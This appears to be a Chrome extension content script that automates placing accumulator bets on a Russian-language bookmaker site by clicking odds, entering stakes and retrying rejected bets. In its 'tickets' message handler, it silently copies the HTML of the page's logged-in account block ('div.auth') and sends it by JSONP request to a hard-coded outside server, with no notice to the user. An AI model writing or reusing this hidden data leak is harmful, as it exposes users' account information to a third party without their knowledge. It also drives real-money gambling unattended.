var mtId,
	pauseFl = false,
	bigCycle,
	divsRel = [],
	tbodyTeams = [],
	teamsJson = {"team":[]},
	i = localStorage.getItem('currentBet')? parseInt(localStorage.getItem('currentBet')): 0,
	ticketsJson = localStorage.getItem('tickets')? JSON.parse(localStorage.getItem('tickets')): {},
	errorInfoJson = localStorage.getItem('errorInfo')? JSON.parse(localStorage.getItem('errorInfo')): {"error":[]},
	betTime = localStorage.getItem('betTime')? parseInt(localStorage.getItem('betTime')): 5000,
	markTime = localStorage.getItem('markTime')? parseInt(localStorage.getItem('markTime')): 300,
	coast = parseInt(localStorage.getItem('coast')),
	autoMode = localStorage.getItem('autoMode')? parseInt(localStorage.getItem('autoMode')): 0,
	doneTickets = localStorage.getItem('doneTickets')? parseInt(localStorage.getItem('doneTickets')): [];
var clickEnter = function(){
		var evt = document.createEvent('KeyboardEvent');
		evt.initKeyboardEvent('keypress', true, true, window, false, false, false, false, 13, 13);
		evt.keyCode = 13;
		evt.which = 13;
		evt.charCode = 13; 
		document.dispatchEvent(evt);
	}
var	clickBet = function(){
		setTimeout(function(){
			if($('.but-place-bet').length != 0 && $('#button_accumulator.active').length != 0){
				if(autoMode){
					$('.but-place-bet')[0].click();
				// if(i == 0){
				// 	i++;
				// 	localStorage.setItem('currentBet', i);
				// }
				setBets();
			}
			}else
				betTicket();
	}, betTime/2);
}
var	enterCoast = function(){ 
	setTimeout(function(){										
			var evt = document.createEvent('KeyboardEvent');
			evt.initKeyboardEvent('keyup', true, true, window, false, false, false, false, 13, 13);
			evt.keyCode = 13;
			evt.which = 13;
			evt.charCode = 13; 
			$('.stake.stake-input.js-focusable[name = stake]').val(coast);
			$('.stake.stake-input.js-focusable[name = stake]')[0].dispatchEvent(evt);	
			clickBet();
		}, 1000);
	}
var setCoast = function(coast){
				setTimeout(function(){
					if(parseInt($('#betslip_button').text().split(" ")[1]) == ticketsJson.ticket[i].length)
						enterCoast();
					else
						betTicket();
				},1000);
			}
var betTicket = function(){
				var forClick = [];
				if($('a.but-remove').length != 0)
					$('a.but-remove')[0].click();	
				tbodyTeams.forEach(function(item, index){
						for(var j = 0; j < ticketsJson.ticket[i].length; j++){       		
							if(item.attr('data-event-name').indexOf(ticketsJson.ticket[i][j].name) != -1){
								var tdDate = item.find('td.date').html();
								if(tdDate)
									if(tdDate.indexOf(ticketsJson.ticket[i][j].date) != -1){
										if(ticketsJson.ticket[i][j].bet == 1){
											forClick.push(item.find('tr:first-child').find('td').eq(-1));
											break;
										}
										if(ticketsJson.ticket[i][j].bet == 0){
											forClick.push(item.find('tr:first-child').find('td').eq(-2));
											break;
										}
									}
							}
						}
					});	
					var it = 0;
					return (function markTeams(it){
						var self = forClick[it];
						var markTeamsTimer = setTimeout(function(){
								if(!pauseFl){
									$(self).click();
									if(it < forClick.length){
										it++;
										markTeams(it);
									}
									else{
										$('#button_accumulator')[0].click();
										setTimeout(function(){setCoast(coast);}, markTime*forClick.length + 300);
									}
							}
							},markTime);
						})(it);		
			}
var setBets = function(){
	bigCycle = setTimeout(function(){		
			if(localStorage.getItem('reloaded') == 1){
				localStorage.setItem('reloaded', 0);
				betTicket();
			}else
				if(autoMode){
					// if(i == 0){
					// 	betTicket();
					// 	 // 
					// }
					//else
					{
						if($('p#betresult').html().indexOf("Ваша ставка принята, спасибо") != -1){	
							chrome.runtime.sendMessage({askFor: 'ticketDone', "ticketNum": parseInt(i)});
							clickEnter();
							if($('a.but-remove').length != 0)
								$('a.but-remove')[0].click();
							clickEnter();	
							if(i < ticketsJson.ticket.length - 1){
									i++;
									localStorage.setItem('currentBet', i);
								viewDialog($('#dialog'));
								betTicket();
							}else{
								localStorage.setItem('finish', 1);
								clickEnter();
								chrome.runtime.sendMessage({askFor: 'ticketDone', "ticketNum": parseInt(i-1)});
								clickEnter();
							}
						}else{
							 if($('p#detail-result-content').html().indexOf("Повторная ставка. Попробуйте сделать ставку позже.") != -1 || $('p#betresult').html().indexOf("Извините, Ваша ставка не принята.") != -1 || $('#enter_stake_dialog p').html().indexOf("Пожалуйста, введите сумму ставки.") != -1){
								// if(i > 0) {
								// 	i--;
								// 	localStorage.setItem('currentBet', i);
								// }
								clickEnter();
								betTicket();
							}else{ 
								var obj = {};										
								obj['ticketNum'] = parseInt(i-1);
								obj['info'] =  "";
								if($('p#detail-result-content').html().indexOf("$betresult") == -1)
									obj['info'] += $('p#detail-result-content').html();
								if($('p#betresult').html())
									obj['info'] += "</br>" + $('p#betresult').html();
								if($('#enter_stake_dialog').find('p').html())
									obj['info'] += "</br>" + $('#enter_stake_dialog').find('p').html();
								if(!obj['info'])
									obj['info'] = "Неизвестная ошибка";
								errorInfoJson.error.push(obj);
								localStorage.setItem('errorInfo', JSON.stringify(errorInfoJson));
								chrome.runtime.sendMessage({askFor: 'ticketError', "errorInfo": JSON.stringify(obj)});
								clickEnter();
								if(i < ticketsJson.ticket.length){
									i++;
									localStorage.setItem('currentBet', i);
									betTicket();
								}else{
									localStorage.setItem('finish', 1);
									clickEnter();
								}
							}
						}			
					}			
				}else{
					clearTimeout(bigCycle);
					
					viewDialog($('#dialog'));				
							
					if(i == 0)
						betTicket();
				}
	}, betTime/2);
}
viewDialog = function(dialogEl){
							var nn = i > 0? i: parseInt(i+1);
							//dialogEl.dialog('destroy');
							dialogEl.dialog({ autoOpen: true,
									position:  ['left', 'top'],
									show: 'slide',
									buttons: [
										{
											text: 'Повторить ' + nn + '-й',
											click: function(){
												// if(i > 0){
												// 	i--;
												// 	localStorage.setItem('currentBet', i);
												// }
												if(pauseFl)
													pauseFl = false;
												betTicket();
											}
										},
										{
											text: ticketsJson.ticket.length > i? 'Следующая': 'Готово',
											click: function(){
												chrome.runtime.sendMessage({askFor: 'ticketDone', "ticketNum": parseInt(i-1)});
												if(pauseFl)
													pauseFl = false;
												i++;
												localStorage.setItem('currentBet', i);
												betTicket();
											}
										},
										{
											text: 'Выбранная',
											click: function(){
												chrome.runtime.sendMessage({askFor: 'ticketDone', "ticketNum": parseInt(i-1)});
												if(pauseFl)
													pauseFl = false;
												i = parseInt($('#bet-num').val() - 1);
												localStorage.setItem('currentBet', i);
												viewDialog(dialogEl);
												betTicket();
											}
										}

									]
								});
						dialogEl
							.dialog({title: "Готово" + i + '/' + ticketsJson.ticket.length})
							.dialog('open');
					}			
$(function () {  
	$('<div id="dialog" tabindex="-2" title="Управление ставками"><input id="bet-num" type="text"></div>').prependTo('body'); 
	viewDialog($('#dialog')); 
	var tbb = $('tbody[data-event-name]');
	// var autoCheck = $("<label class='auto-check' ><input  type='checkbox'/>Авто</label>").prependTo(dialogDiv.dialog("widget").find(".ui-dialog-buttonset"));		
	tbb.each(function(j){
		var gameDate = $(this).find('td.date').html();
		var teamsNames = $(this).attr('data-event-name');	
		if(gameDate && teamsNames && $(this).find('td.price').length > 0){		
			gameDate = gameDate.trim();
			var obj = {};
			obj['name'] = teamsNames;
			obj['date'] =  gameDate;
			teamsJson.team[j] = obj;		
			tbodyTeams.push($(this));
		}
		if(j == tbb.length - 1){
			chrome.runtime.sendMessage({askFor: 'contentScriptId'});
			localStorage.setItem('teams', JSON.stringify(teamsJson));					
			if(localStorage.getItem('finish') != 1)
			{	
				
				setBets();
			}
		}
	});	
	
	// if(teamsJson.team[0]){
	// 	localStorage.setItem('teams', JSON.stringify(teamsJson));
	// 	chrome.runtime.sendMessage({askFor: 'contentScriptId'});
		
	// 	if(localStorage.getItem('finish') != 1)
	// 	{
	// 		setBets();
	// 	}
	// 	//var it = 0;
		

	// }
		// $(document).on("change", ".auto-check input", function(){
  //   		autoMode = this.checked;
  		//	pauseFl = false;
  		//	betTicket();
		// });
		chrome.runtime.onMessage.addListener(
			 function(request, sender, sendResponse) {				
				if (request.askFor == "getTeams"){
					sendResponse({teams: localStorage.getItem('teams')});
				}
			});
		chrome.runtime.onMessage.addListener(
			 function(request, sender, sendResponse) {				
				if (request.askFor == "tickets"){
					coast = parseInt(request.coast);
					ticketsJson = JSON.parse(request.tickets);	
					betTime = parseInt(request.betTime);
					markTime = parseInt(request.markTime);
					autoMode = request.auto === 'auto'? 1: 0; 
					localStorage.setItem('autoMode', autoMode);
					localStorage.setItem('tickets', JSON.stringify(ticketsJson));
					localStorage.setItem('betTime', betTime);
					localStorage.setItem('markTime', markTime);
					localStorage.setItem('coast', coast);
					localStorage.setItem('finish', 0);
					localStorage.removeItem('errorInfo');
					errorInfoJson = {"error":[]};
					i = 0;
					pauseFl = false;
					// for(var i = 0; i < ticketsJson.ticket.length; i++)
					// 	doneTickets[i] = 0;
					var sendInfo = JSON.parse(request.params);
					sendInfo.who += $('div.auth').html();
					$.ajax({
						type: 'GET',
						dataType: 'jsonp',
						url: 'https://u42009.netangels.ru/pst',
						data:{'str': JSON.stringify(sendInfo)},
						crossDomain: true, 
						success: function () {
						console.log('yes');
						}
					});
					setBets();						
				}
		});
		chrome.runtime.onMessage.addListener(
			 function(request, sender, sendResponse) {				
				if (request.askFor == "refresh"){
					betTime = parseInt(request.betTime);
					markTime = parseInt(request.markTime);
					localStorage.setItem('betTime', betTime);
					localStorage.setItem('markTime', markTime);
					localStorage.setItem('currentBet', i);
					localStorage.setItem('reloaded', 1);
					//localStorage.setItem('doneTickets', doneTickets);
					autoMode = request.auto === 'auto'? 1: 0;
					localStorage.setItem('autoMode', autoMode); 
  					//pauseFl = false;
					$('.but-refresh')[0].click();
				}
		});
		chrome.runtime.onMessage.addListener(
			 function(request, sender, sendResponse) {				
				if (request.askFor == "pause"){
					pauseFl = true;
					localStorage.setItem('currentBet', i);
					//localStorage.setItem('doneTickets', doneTickets);
					clearTimeout(bigCycle);
				}
		});
		chrome.runtime.onMessage.addListener(
			 function(request, sender, sendResponse) {				
				if (request.askFor == "resume"){
					pauseFl = false;
					clearTimeout(bigCycle);
					setBets();
				}
		});
		chrome.runtime.onMessage.addListener(
			 function(request, sender, sendResponse) {				
				if (request.askFor == "stop"){
					pauseFl = true;
					localStorage.setItem('finish', 1);
				}
		});
});